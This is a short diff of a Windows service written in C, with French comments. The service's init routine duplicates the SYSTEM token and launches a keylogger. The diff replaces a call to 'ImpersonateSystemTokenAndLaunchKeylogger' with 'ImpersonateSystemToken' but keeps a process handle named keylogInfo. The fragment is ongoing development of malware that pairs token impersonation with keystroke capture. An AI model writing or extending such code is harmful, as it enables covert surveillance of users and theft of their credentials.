@@ -22,6 +22,7 @@ VOID WINAPI SvcMain(DWORD ac, LPTSTR *av)
 VOID SvcInit(DWORD ac, LPTSTR *av)
 {
     (void)ac;
+    (void)av;
     PROCESS_INFORMATION keylogInfo;
     // un event sera cree lorsque le service stoppera
     svcStopEvt = CreateEvent(NULL, TRUE, FALSE, NULL);
@@ -32,10 +33,7 @@ VOID SvcInit(DWORD ac, LPTSTR *av)
     }
     //on previent le gestionnaire de service que le service a demarre
     ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
-    //On duplique le token systeme, puis on lance le programme avec
-    log("\nLa session utilisee est >\n");
-    log(av[1]);
-    ImpersonateSystemTokenAndLaunchKeylogger(&keylogInfo, atoi(av[1]));
+    ImpersonateSystemToken(&keylogInfo);
     while (1)
     {
         DWORD stopEvt = WaitForSingleObject(svcStopEvt, 1);
